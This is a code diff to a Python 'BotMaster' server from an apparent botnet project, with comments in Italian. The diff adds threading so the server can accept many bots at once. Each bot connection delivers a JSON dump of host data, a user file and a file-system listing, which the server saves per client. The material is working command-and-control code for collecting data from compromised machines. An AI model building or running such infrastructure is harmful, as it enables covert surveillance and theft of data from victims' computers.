@@ -4,6 +4,9 @@ import socket
 import pprint
 import struct
 
+from _thread import *
+import threading
+
 pp = pprint.PrettyPrinter(indent=4)
 
 PORT = 6969
@@ -14,7 +17,8 @@ SUCCESSFUL_RESPONSE = 'ok'
 
 class BotMaster:
     def __init__(self):
-        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM indica l'utilizzo di una socket TCP.
+        self.serverSocket = socket.socket(socket.AF_INET,
+                                          socket.SOCK_STREAM)  # SOCK_STREAM indica l'utilizzo di una socket TCP.
         self.start()
 
     def __del__(self):
@@ -30,37 +34,39 @@ class BotMaster:
         print('The server is ready to receive!')
         self.waitForClient()
 
+    def client_thread(self, client, client_id):
+        data = self.recv_msg(client).decode(FORMAT)
 
+        dict = json.loads(data)
+        pp.pprint(dict)  # Stampa di ciò che verrà riportato nel file .json
 
+        with open(f'{client_id}/data.json', 'w') as fp:
+            json.dump(dict, fp, indent=4)
+
+        data = self.recv_msg(client).decode(FORMAT)
+        with open(f'{client_id}/user.txt', 'w', encoding=FORMAT) as fp:
+            fp.write(data)
+
+        data = self.recv_msg(client).decode(FORMAT)
+        with open(f'{client_id}/fileSystem.txt', 'w', encoding=FORMAT) as fp:
+            fp.write(data)
+
+        client.close()
 
     def waitForClient(self):
         """
         Procedura tramite la quale il server accetta la richiesta di connessione del client e salva i dati ricevuti in un file .json.
         :return: None
         """
+
+        i = 1
         while True:
             connection, addr = self.serverSocket.accept()
             print('The connection has been accepted! Client ip address: ', addr[0])
 
-
-            data = self.recv_msg(connection).decode(FORMAT)
-
-            dict = json.loads(data)
-            pp.pprint(dict) # Stampa di ciò che verrà riportato nel file .json
-
-            with open('data.json', 'w') as fp:
-                json.dump(dict, fp, indent=4)
-
-            data = self.recv_msg(connection).decode(FORMAT)
-            with open('user.txt', 'w', encoding=FORMAT) as fp:
-                fp.write(data)
-
-            data = self.recv_msg(connection).decode(FORMAT)
-            with open('fileSystem.txt', 'w', encoding=FORMAT) as fp:
-                fp.write(data)
-
-            connection.close()
-
+            # start client thread
+            start_new_thread(self.client_thread, (connection, i))
+            i += 1
 
     def recv_msg(self, conn):
         raw_msglen = self.recvall(conn, 4)
@@ -77,7 +83,6 @@ class BotMaster:
                 return None
             data.extend(packet)
         return data
-
 
 
 if __name__ == '__main__':
